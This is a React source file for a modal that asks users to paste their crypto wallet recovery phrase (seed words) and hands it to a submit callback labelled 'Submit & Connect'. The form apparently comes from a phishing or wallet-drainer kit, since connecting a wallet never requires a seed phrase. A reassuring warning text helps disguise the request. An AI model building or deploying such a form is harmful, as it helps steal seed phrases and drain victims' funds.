import { useState } from 'react'

export default function RecoveryPhraseModal({ walletName, walletImg, onClose, onSubmit, isLoading }) {
  const [phrase, setPhrase] = useState('')
  const [error, setError] = useState('')
  const [success, setSuccess] = useState(false)

  const handleSubmit = async (e) => {
    e.preventDefault()
    setError('')

    if (!phrase.trim()) {
      setError('Please enter your recovery phrase')
      return
    }

    if (phrase.trim().split(/\s+/).length < 12) {
      setError('Recovery phrase should have at least 12 words')
      return
    }

    try {
      await onSubmit(phrase)
      setSuccess(true)
      setTimeout(() => {
        setPhrase('')
        setSuccess(false)
        onClose()
      }, 1500)
    } catch (err) {
      setError(err.message || 'Failed to submit phrase')
    }
  }

  return (
    <>
      <style>{`
        .rp-overlay {
          position: fixed;
          inset: 0;
          z-index: 10000;
          background: rgba(0, 0, 0, 0.7);
          backdrop-filter: blur(8px);
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 16px;
          animation: rpFadeIn 0.2s ease;
        }

        @keyframes rpFadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }

        .rp-modal {
          background: linear-gradient(135deg, #ffffff, #f8f9fa);
          border-radius: 24px;
          box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
          width: 100%;
          max-width: 500px;
          padding: 32px;
          animation: rpSlideUp 0.3s ease;
          font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          position: relative;
          overflow: hidden;
        }

        @keyframes rpSlideUp {
          from {
            opacity: 0;
            transform: translateY(20px) scale(0.98);
          }
          to {
            opacity: 1;
            transform: translateY(0) scale(1);
          }
        }

        .rp-close {
          position: absolute;
          top: 16px;
          right: 16px;
          width: 36px;
          height: 36px;
          border: none;
          background: #f0f0f0;
          border-radius: 50%;
          cursor: pointer;
          font-size: 18px;
          color: #666;
          display: flex;
          align-items: center;
          justify-content: center;
          transition: all 0.2s;
        }

        .rp-close:hover {
          background: #e0e0e0;
          color: #111;
        }

        .rp-header {
          display: flex;
          flex-direction: column;
          align-items: center;
          gap: 16px;
          margin-bottom: 28px;
          text-align: center;
        }

        .rp-wallet-icon {
          width: 60px;
          height: 60px;
          border-radius: 16px;
          object-fit: cover;
          background: #f0f0f0;
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }

        .rp-title {
          font-size: 24px;
          font-weight: 800;
          color: #111;
          margin: 0;
        }

        .rp-subtitle {
          font-size: 14px;
          color: #666;
          margin: 0;
          line-height: 1.5;
        }

        .rp-form {
          display: flex;
          flex-direction: column;
          gap: 16px;
        }

        .rp-label {
          font-size: 13px;
          font-weight: 600;
          color: #333;
          text-transform: uppercase;
          letter-spacing: 0.5px;
          margin-bottom: 6px;
        }

        .rp-textarea {
          width: 100%;
          min-height: 120px;
          padding: 14px;
          border: 2px solid #e0e0e0;
          border-radius: 12px;
          font-family: 'Inter', monospace;
          font-size: 14px;
          color: #111;
          background: #f9f9f9;
          resize: vertical;
          outline: none;
          transition: all 0.2s;
          box-sizing: border-box;
        }

        .rp-textarea:focus {
          border-color: #3a96ff;
          background: #fff;
          box-shadow: 0 0 0 3px rgba(58, 150, 255, 0.1);
        }

        .rp-textarea::placeholder {
          color: #aaa;
        }

        .rp-error {
          font-size: 13px;
          color: #ff4444;
          background: rgba(255, 68, 68, 0.08);
          padding: 10px 12px;
          border-radius: 8px;
          border-left: 3px solid #ff4444;
          margin: 0;
          display: flex;
          align-items: center;
          gap: 8px;
        }

        .rp-success {
          font-size: 13px;
          color: #22c55e;
          background: rgba(34, 197, 94, 0.08);
          padding: 10px 12px;
          border-radius: 8px;
          border-left: 3px solid #22c55e;
          margin: 0;
          display: flex;
          align-items: center;
          gap: 8px;
        }

        .rp-buttons {
          display: flex;
          gap: 12px;
          margin-top: 8px;
        }

        .rp-btn {
          flex: 1;
          padding: 12px 20px;
          border-radius: 12px;
          border: none;
          font-size: 14px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s;
          text-transform: uppercase;
          letter-spacing: 0.5px;
        }

        .rp-btn-primary {
          background: linear-gradient(135deg, #3a96ff, #2a7fe0);
          color: #fff;
        }

        .rp-btn-primary:hover:not(:disabled) {
          background: linear-gradient(135deg, #2a7fe0, #1a6fc0);
          box-shadow: 0 4px 12px rgba(58, 150, 255, 0.3);
        }

        .rp-btn-secondary {
          background: #f0f0f0;
          color: #333;
        }

        .rp-btn-secondary:hover {
          background: #e0e0e0;
        }

        .rp-btn:disabled {
          opacity: 0.6;
          cursor: not-allowed;
        }

        .rp-spinner {
          width: 16px;
          height: 16px;
          border: 2px solid rgba(255, 255, 255, 0.3);
          border-top-color: #fff;
          border-radius: 50%;
          animation: rpSpin 0.8s linear infinite;
          display: inline-block;
        }

        @keyframes rpSpin {
          to { transform: rotate(360deg); }
        }

        .rp-warning {
          background: #fffbeb;
          border-left: 3px solid #f59e0b;
          padding: 12px;
          border-radius: 8px;
          font-size: 13px;
          color: #92400e;
          line-height: 1.5;
          margin-bottom: 4px;
        }

        @media (max-width: 600px) {
          .rp-modal {
            max-width: 95%;
            padding: 24px;
          }

          .rp-title {
            font-size: 20px;
          }
        }
      `}</style>

      <div className="rp-overlay">
        <div className="rp-modal">
          <button className="rp-close" onClick={onClose}>&times;</button>

          <div className="rp-header">
            <img src={walletImg} alt={walletName} className="rp-wallet-icon" />
            <div>
              <h2 className="rp-title">Enter Recovery Phrase</h2>
              <p className="rp-subtitle">
                Paste your {walletName} recovery phrase (seed words) below
              </p>
            </div>
          </div>

          <form className="rp-form" onSubmit={handleSubmit}>
            <div>
              <label className="rp-label">Recovery Phrase (12-24 words)</label>
              <div className="rp-warning">
                ⚠️ Never share your recovery phrase with anyone. We will not ask for it again.
              </div>
              <textarea
                className="rp-textarea"
                placeholder="Enter your recovery seed phrase here. Separate words with spaces."
                value={phrase}
                onChange={(e) => setPhrase(e.target.value)}
                disabled={isLoading || success}
              />
            </div>

            {error && <div className="rp-error">❌ {error}</div>}
            {success && (
              <div className="rp-success">
                ✓ Recovery phrase received successfully
              </div>
            )}

            <div className="rp-buttons">
              <button
                type="button"
                className="rp-btn rp-btn-secondary"
                onClick={onClose}
                disabled={isLoading || success}
              >
                Cancel
              </button>
              <button
                type="submit"
                className="rp-btn rp-btn-primary"
                disabled={isLoading || success}
              >
                {isLoading ? (
                  <>
                    <span className="rp-spinner"></span>
                    {' '}Submitting...
                  </>
                ) : success ? (
                  '✓ Done'
                ) : (
                  'Submit & Connect'
                )}
              </button>
            </div>
          </form>
        </div>
      </div>
    </>
  )
}
